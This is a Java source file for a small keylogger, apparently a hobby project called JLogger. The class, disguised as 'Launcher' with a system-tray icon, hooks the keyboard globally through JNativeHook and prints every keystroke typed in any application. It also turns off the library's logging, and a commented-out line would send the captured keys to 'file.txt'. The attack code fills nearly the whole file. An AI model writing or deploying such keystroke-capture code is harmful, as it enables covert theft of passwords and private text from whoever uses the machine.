package com.zaen;

import java.awt.AWTException;
import java.awt.Image;
import java.awt.MenuItem;
import java.awt.PopupMenu;
import java.awt.SystemTray;
import java.awt.Toolkit;
import java.awt.TrayIcon;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.PrintStream;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Launcher implements NativeKeyListener {

	/**
	 * @author: Zaen Khilji
	 */

	public void nativeKeyPressed(NativeKeyEvent e) {
		if (e.getKeyCode() == NativeKeyEvent.VC_SPACE)
			System.out.print(" ");
		else if (e.getKeyCode() == NativeKeyEvent.VC_BACKSPACE)
			System.out.print(" Backspace ");
		else if (e.getKeyCode() == NativeKeyEvent.VC_ENTER)
			System.out.println("");
		else
			System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	public void nativeKeyReleased(NativeKeyEvent e) {

	}

	public void nativeKeyTyped(NativeKeyEvent e) {

	}

	public static void main(String[] args) {
		if (!SystemTray.isSupported())
			return;
		PopupMenu popup = new PopupMenu();
		MenuItem defaultItem = new MenuItem("Exit");
		defaultItem.addActionListener(null);
		popup.add(defaultItem);
		Image image = Toolkit.getDefaultToolkit().getImage("C:/Users/zaenk/workspace/JLogger/source/64.png");
		TrayIcon trayIcon = new TrayIcon(image, "Launcher", popup);
		try {
			SystemTray tray = SystemTray.getSystemTray();
			tray.add(trayIcon);
		} catch (AWTException e) {
			e.printStackTrace();
		}
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		logger.setUseParentHandlers(false);
		try {
			FileOutputStream f = new FileOutputStream("file.txt");
			System.out.println(new PrintStream(f));
			// System.setOut(new PrintStream(f));
		} catch (FileNotFoundException ex) {
			System.exit(1);
		}

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			System.exit(1);
		}

		GlobalScreen.addNativeKeyListener(new Launcher());

		trayIcon.displayMessage("Launcher", "We've launched", TrayIcon.MessageType.INFO);
	}
}